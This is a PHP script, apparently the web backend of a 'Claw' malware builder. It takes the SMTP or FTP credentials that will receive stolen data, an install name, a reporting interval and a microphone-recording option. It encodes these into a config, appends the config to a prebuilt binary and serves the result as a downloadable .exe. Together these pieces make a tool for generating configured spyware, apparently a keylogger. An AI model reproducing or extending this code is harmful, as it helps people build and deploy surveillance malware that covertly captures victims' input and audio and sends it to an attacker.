// Claw Web Builder
// This Code needs to be changed according to your html build page
// This snippet is according to the envoironment, And setup of https://quantumcored.com/users/clawmain.php
// This is hosted here https://quantumcored.com/users/clawnew.php

<?php


function generateRandomString($length = 10) {
	return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}



if(!empty($_POST['proto']))
{
	$protocol = $_POST['proto'];
	if(!empty($_POST['time'])){
		$interval = "";
		
		if($_POST['time'] == "5 Minutes"){
			$interval = "300000";
		} else if($_POST['time'] == "10 Minutes"){
			$interval = "600000";
		} else if($_POST['time'] == "15 minutes"){
			$interval = "900000";
		}
	} 
	else {
		header("Location: clawmain.php");
	}
	if($protocol == "smtp")
	{
		if(empty($_POST['email']) || empty($_POST['password']) || empty($_POST['gmailinstallname'])){
			header("Location: clawmain.php");
		} else {
			$final_value = base64_encode($protocol) . "[]" . base64_encode($_POST ['email']) . "[]" . base64_encode($_POST['password']) . "[]" . base64_encode($_POST['gmailinstallname']) . "[]" . base64_encode($interval) . "[]" . base64_encode($_POST['mic']);
		}
		
	}
	else {
		if(empty($_POST['ftpserver']) || empty($_POST['username']) || empty($_POST['passw']) || empty($_POST['installname'])){
			header("Location: clawmain.php");
		} else {
			$serveruser = $_POST['ftpserver'] . "," . $_POST['username'];
			$final_value = base64_encode($protocol) . "[]" . base64_encode($serveruser) . "[]" . base64_encode($_POST['passw']) . "[]" . base64_encode($_POST['installname']) . "[]" . base64_encode($interval) . "[]" . base64_encode($_POST['ftpmic']);
		}
		
	}

	$binfilename = $protocol . "_" . generateRandomString(5) . ".exe";
	if($_POST['size'] == "Small"){
		
		copy("bin/bin_s", "output/".$binfilename);
		$bin = fopen( "output/" . $binfilename, "ab");
		fwrite($bin, "\n\n");
		fwrite($bin, $final_value);
		fclose($bin);
	} else {
		copy("bin/bin", "output/".$binfilename);
		$bin = fopen( "output/" . $binfilename, "ab");
		fwrite($bin, "\n\n");
		fwrite($bin, $final_value);
		fclose($bin);
	}
		

	header("Location: http://$_SERVER[HTTP_HOST]/users/output/$binfilename");
} else {
	header("Location: clawmain.php");
}
// {
	
	
?>
</p>
